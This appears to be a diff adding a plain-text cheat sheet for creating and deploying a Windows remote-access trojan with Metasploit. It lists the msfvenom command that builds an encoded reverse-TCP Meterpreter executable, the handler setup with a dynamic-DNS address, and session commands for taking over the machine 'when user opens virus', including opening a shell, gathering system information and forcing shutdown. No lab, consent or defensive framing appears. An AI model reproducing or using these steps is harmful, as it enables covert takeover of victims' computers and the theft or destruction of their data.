@@ -1,0 +1,24 @@
+1) :::in terminal:::
+          
+         msfvenom -p windows/meterpreter/reverse_tcp -a x86 -e x86/shikata_ga_nai -f exe LHOST=ip_address LPORT=4444 > NAME.exe
+
+2) :::in terminal:::
+
+          msfconsole
+          msf> use exploit/multi/handler
+          msf exploit[handler] > set payload windows/meterpreter/reverse_tcp
+          msf exploit[handler] > show options
+          msf exploit[handler] > set LHOST your_IP                                //ip from no-ip
+                               > set LPORT 4444
+                               > set ReverseListenerBindAddress                   //ip from ifconfig  //local IP
+                               > exploit                                          //starts session when user opens virus
+
+3) now we are in session:::::::::::
+         
+         > help                 //to see options
+         > shell                //to use computer
+         > sysinfo              //get system information
+         > notepad              //opens notepad
+         > echo anybody_there > bla.txt                  //writes on notepad
+         > bla.txt 
+         > shutdown /P           //poweroff
